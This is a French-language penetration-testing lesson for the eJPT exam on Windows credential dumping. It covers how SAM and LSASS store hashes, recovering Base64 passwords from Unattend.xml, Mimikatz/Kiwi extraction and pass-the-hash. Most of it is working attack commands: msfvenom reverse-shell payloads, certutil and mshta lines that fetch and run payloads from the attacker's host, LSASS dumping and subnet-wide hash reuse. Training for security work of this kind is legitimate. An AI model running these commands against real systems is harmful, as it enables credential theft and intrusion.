# Windows Credential Dumping

Cette leçon couvre comment Windows stocke les mots de passe, comment les attaquants les extraient et comment ils utilisent les identifiants capturés pour se déplacer latéralement — des techniques critiques pour l'eJPT.

> ⚠️ **Note** : Toutes les techniques nécessitent une **session Meterpreter élevée/administrative** sur la cible. Remplacez les IPs et valeurs par les vôtres.

---

## Comment Windows Stocke les Mots de Passe

### La Base de Données SAM

La base de données **SAM (Security Accounts Manager)** stocke tous les hashes de mots de passe des comptes utilisateurs locaux sur Windows. Points clés :

- Le fichier SAM se trouve à `C:\Windows\System32\config\SAM`.
- Il **ne peut pas être copié pendant que Windows fonctionne** — le noyau NT le maintient verrouillé.
- Dans les versions modernes de Windows, la base SAM est **chiffrée avec une syskey**.
- Les attaquants utilisent des **techniques en mémoire** pour extraire les hashes du **processus LSASS** plutôt que d'accéder directement au fichier.
- L'authentification et la vérification des identifiants sont gérées par **LSA (Local Security Authority)**, qui s'exécute en tant que processus `lsass.exe`.

> ⚠️ Vous avez besoin d'une **session élevée/admin** pour extraire les hashes de SAM ou LSASS.

### Types de Hash

| Type de Hash | Utilisé Dans | Algorithme | Faiblesses |
|-------------|-------------|-----------|-----------|
| **LM (LanMan)** | Windows XP et antérieurs / Server 2003 | DES | Sans sel, divise le mot de passe en deux morceaux de 7 chars, convertit en majuscules — facilement cracké avec des rainbow tables |
| **NTLM** | Windows Vista et suivants | MD4 | Sans sel — attaques par force brute et rainbow tables toujours efficaces, mais plus fort que LM |

**Processus de hashing LM** (pourquoi il est faible) :
1. Le mot de passe est divisé en deux **morceaux de 7 caractères**.
2. Tous les caractères sont convertis en **majuscules** (réduit l'espace des clés de moitié).
3. Chaque morceau est haché **séparément** avec DES.
4. Sans sel — des mots de passe identiques produisent toujours des hashes identiques.

**Améliorations de NTLM sur LM** :
- Ne **divise pas** le hash.
- Est **sensible à la casse**.
- Supporte les **symboles et caractères Unicode**.
- Toujours **sans sel** — rainbow tables et force brute restent viables.

---

## 1. Recherche de Mots de Passe dans les Fichiers de Configuration

### Que sont les Fichiers d'Installation Sans Assistance ?

Windows peut automatiser des déploiements massifs du système d'exploitation via l'utilitaire **Unattended Windows Setup**. Il utilise des fichiers de configuration contenant les paramètres système et — de manière critique — **le mot de passe du compte Administrateur**.

Si ces fichiers restent sur le système après l'installation, les attaquants peuvent lire directement les identifiants de l'Administrateur.

**Emplacements courants** :

```
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Autounattend.xml
```

Les mots de passe peuvent être stockés en **encodage Base64** (pas chiffrés — juste encodés, trivialement réversible).

### Étape 1 : Livrer et Exécuter un Payload

Générer un payload sur Kali :

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=<votre_ip> \
  LPORT=1234 \
  -f exe > payload.exe
```

L'héberger avec un serveur web Python :

```bash
python3 -m http.server 80
```

Le télécharger sur la cible via l'invite de commandes :

```cmd
certutil -urlcache -f http://<votre_ip>/payload.exe payload.exe
payload.exe
```

### Étape 2 : Configurer le Listener

```bash
msfconsole
msf6 > use multi/handler
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST <votre_ip>
msf6 > set LPORT 1234
msf6 > exploit -j
```

### Étape 3 : Trouver le Fichier Unattend.xml

Une fois que vous avez une session Meterpreter, cherchez le fichier :

```bash
meterpreter > search -f Unattend.xml
meterpreter > download C:\\Windows\\Panther\\Unattend.xml
```

### Étape 4 : Décoder le Mot de Passe Base64

**Sur Kali** (Linux) :

```bash
echo "QWRtaW5AMTIz" | base64 -d
```

**Sur la cible** (PowerShell) :

```powershell
$password = 'QWRtaW5AMTIz'
$password = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($password))
echo $password
```

### Étape 5 : Utiliser les Identifiants

**Option A — Ouvrir un cmd admin sur la cible** :

```cmd
runas.exe /user:administrator cmd
```

**Option B — Obtenir un shell Meterpreter via hta_server** :

```bash
msf6 > use exploit/windows/misc/hta_server
msf6 > set LHOST <votre_ip>
msf6 > exploit
# Copier l'URL générée, puis sur la cible :
mshta.exe http://<votre_ip>:<port>/payload.hta
```

### Étape 6 : Trouver les Fichiers de Config avec PowerSploit (Alternatif)

Si vous avez déjà une session, utilisez **PowerUp** de PowerSploit pour auditer les chemins d'élévation de privilèges incluant les fichiers sans assistance :

```powershell
cd C:\Users\<utilisateur>\Desktop\PowerSploit\Privesc\
powershell -ep bypass
. .\PowerUp.ps1
Invoke-PrivescAudit
```

PowerUp signalera `Unattend.xml` s'il est trouvé et affichera le mot de passe encodé.

---

## 2. Extraction de Hashes avec Mimikatz / Kiwi

### Qu'est-ce que Mimikatz ?

**Mimikatz** est un puissant outil de post-exploitation Windows qui extrait :
- **Mots de passe en clair** (si WDigest est activé)
- **Hashes NTLM**
- **Tickets Kerberos**

Tout depuis la **mémoire du processus `lsass.exe`**, où Windows met en cache les identifiants.

**Kiwi** est le portage Metasploit/Meterpreter de Mimikatz — même fonctionnalité, intégrée dans votre session.

> Vous devez **migrer vers un processus 64 bits** et avoir des **privilèges SYSTEM** avant d'extraire.

### Méthode A : Kiwi (via Meterpreter)

#### Étape 1 : Obtenir une Session Meterpreter Admin

Exploiter un service (ex. BadBlue sur le port 80) :

```bash
msfconsole
msf6 > use exploit/windows/http/badblue_passthru
msf6 > set RHOSTS <target_ip>
msf6 > set LHOST <votre_ip>
msf6 > exploit
```

#### Étape 2 : Migrer vers LSASS

```bash
meterpreter > pgrep lsass
meterpreter > migrate <lsass_pid>
```

Migrer vers `lsass.exe` vous donne les privilèges les plus élevés du système (`NT AUTHORITY\SYSTEM`).

#### Étape 3 : Charger Kiwi et Extraire les Identifiants

```bash
meterpreter > load kiwi

# Extraire tous les identifiants (clair + hashes + tickets Kerberos)
meterpreter > creds_all

# Extraire uniquement les hashes de la base SAM
meterpreter > lsa_dump_sam

# Extraire les secrets LSA (mots de passe de comptes de service, identifiants de domaine en cache)
meterpreter > lsa_dump_secrets
```

### Méthode B : Exécutable Mimikatz (via Shell)

Si vous préférez utiliser le binaire standalone de Mimikatz :

#### Étape 1 : Uploader Mimikatz sur la Cible

```bash
meterpreter > upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe C:\\Users\\admin\\AppData\\Local\\Temp\\mimikatz.exe
meterpreter > shell
```

#### Étape 2 : Exécuter Mimikatz

```cmd
C:\> C:\Users\admin\AppData\Local\Temp\mimikatz.exe
```

#### Étape 3 : Activer les Privilèges de Débogage

```
mimikatz # privilege::debug
```

Sortie : `Privilege '20' OK` — confirme que vous avez le privilège de débogage requis.

#### Étape 4 : Extraire les Identifiants

```
# Extraire la base SAM (hashes NTLM des utilisateurs locaux)
mimikatz # lsadump::sam

# Extraire les secrets LSA (identifiants de domaine en cache, comptes de service)
mimikatz # lsadump::secrets

# Extraire les mots de passe en clair de la mémoire (nécessite WDigest activé)
mimikatz # sekurlsa::logonpasswords
```

### Comparatif Kiwi vs Mimikatz

| Fonctionnalité | Kiwi (Meterpreter) | Mimikatz (Exécutable) |
|---------------|-------------------|----------------------|
| **Configuration** | `load kiwi` — instantané | Uploader le binaire, passer au shell |
| **Risque de détection** | Faible (s'exécute en mémoire) | Élevé (binaire sur disque) |
| **Mots de passe en clair** | `creds_all` | `sekurlsa::logonpasswords` |
| **Hashes SAM** | `lsa_dump_sam` | `lsadump::sam` |
| **Secrets LSA** | `lsa_dump_secrets` | `lsadump::secrets` |

### Extraction Rapide de Hashes (Meterpreter)

Si vous avez seulement besoin des hashes NTLM rapidement :

```bash
meterpreter > hashdump
```

Format de sortie : `utilisateur:uid:LM_hash:NTLM_hash:::`

Exemple :
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
```
- Les 32 premiers chars après `:500:` = **hash LM** (généralement vide/par défaut sur Windows moderne)
- Les 32 derniers chars = **hash NTLM** (ce dont vous avez besoin pour Pass-the-Hash)

---

## 3. Attaques Pass-the-Hash (PTH)

### Qu'est-ce que Pass-the-Hash ?

**Pass-the-Hash** est une technique de mouvement latéral où vous utilisez un **hash NTLM capturé directement** pour vous authentifier — sans jamais craquer ni connaître le mot de passe en clair. L'authentification NTLM de Windows accepte le hash lui-même comme preuve d'identité.

**Pourquoi ça fonctionne** : L'authentification NTLM est basée sur un défi-réponse. Le hash est utilisé pour chiffrer un défi du serveur — donc si vous avez le hash, vous pouvez répondre correctement sans connaître le mot de passe.

### Méthode A : Module PsExec (Metasploit)

```bash
msfconsole
msf6 > use exploit/windows/smb/psexec
msf6 > set RHOSTS <target_ip>
msf6 > set SMBUser administrator
msf6 > set SMBPass aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST <votre_ip>
msf6 > exploit
```

Format de `SMBPass` : `LM_hash:NTLM_hash`

Si vous n'avez que le hash NTLM, utilisez le hash LM vide par défaut :
```
aad3b435b51404eeaad3b435b51404ee:<votre_hash_NTLM>
```

### Méthode B : CrackMapExec

CrackMapExec est plus rapide pour tester des identifiants sur plusieurs cibles :

```bash
# S'authentifier et exécuter une commande avec PTH
crackmapexec smb <target_ip> -u administrator -H "8846f7eaee8fb117ad06bdd830b7586c" -x "whoami"

# Tester sur tout un sous-réseau
crackmapexec smb 192.168.1.0/24 -u administrator -H "8846f7eaee8fb117ad06bdd830b7586c"
```

Une authentification réussie affiche `(Pwn3d!)` dans la sortie.

**Flags** :
- `-u` : Nom d'utilisateur
- `-H` : Hash NTLM (hash LM non requis)
- `-x` : Commande à exécuter sur la cible

---

## Chaîne d'Attaque Complète

```
Exploiter Service → Session Meterpreter → Migrer vers LSASS → Extraire Hashes → Pass-the-Hash → Nouvelle Session
```

| Étape | Action | Outil |
|-------|--------|-------|
| **1** | Exploiter un service vulnérable | Metasploit |
| **2** | Obtenir une session Meterpreter | Metasploit |
| **3** | Migrer vers `lsass.exe` | `migrate <pid>` |
| **4** | Extraire les hashes | Kiwi / Mimikatz / `hashdump` |
| **5** | Utiliser les hashes pour le mouvement latéral | PsExec / CrackMapExec |

---

## Points Clés

- La **base de données SAM** stocke les hashes NTLM des utilisateurs locaux — verrouillée par le noyau pendant que Windows fonctionne, accessible via LSASS en mémoire.
- Les **hashes LM** sont faibles — sans sel, divise le mot de passe en deux morceaux de 7 chars en majuscules. Uniquement sur Windows XP/Server 2003 et antérieurs.
- Les **hashes NTLM** sont utilisés depuis Vista — plus forts que LM mais toujours vulnérables à la force brute et aux rainbow tables (sans sel).
- Les fichiers **Unattend.xml** laissés après des installations automatiques de Windows peuvent contenir le mot de passe Administrateur en **encodage Base64** — trivialement réversible.
- Cherchez `Unattend.xml` dans `C:\Windows\Panther\` — utilisez `search -f` dans Meterpreter ou `Invoke-PrivescAudit` avec PowerUp.
- **Mimikatz / Kiwi** extraient hashes et mots de passe en clair de la mémoire de `lsass.exe` — migrez vers LSASS d'abord pour les privilèges SYSTEM.
- **`privilege::debug`** doit être exécuté dans Mimikatz avant d'extraire — confirme que les privilèges de débogage sont actifs.
- **`sekurlsa::logonpasswords`** extrait les mots de passe en clair — fonctionne uniquement si l'authentification WDigest est activée sur la cible.
- **`hashdump`** dans Meterpreter extrait rapidement tous les hashes NTLM locaux — format `utilisateur:uid:LM:NTLM:::`.
- **Pass-the-Hash** utilise les hashes NTLM capturés directement pour l'authentification — pas besoin de craquer les mots de passe.
- **PsExec** (`exploit/windows/smb/psexec`) accepte `LM_hash:NTLM_hash` dans `SMBPass`.
- **CrackMapExec** teste PTH sur plusieurs cibles simultanément — `(Pwn3d!)` confirme une auth réussie.
- Toujours **migrer vers un processus stable 64 bits** (comme `lsass.exe` ou `explorer.exe`) avant d'exécuter des outils d'extraction de credentials.
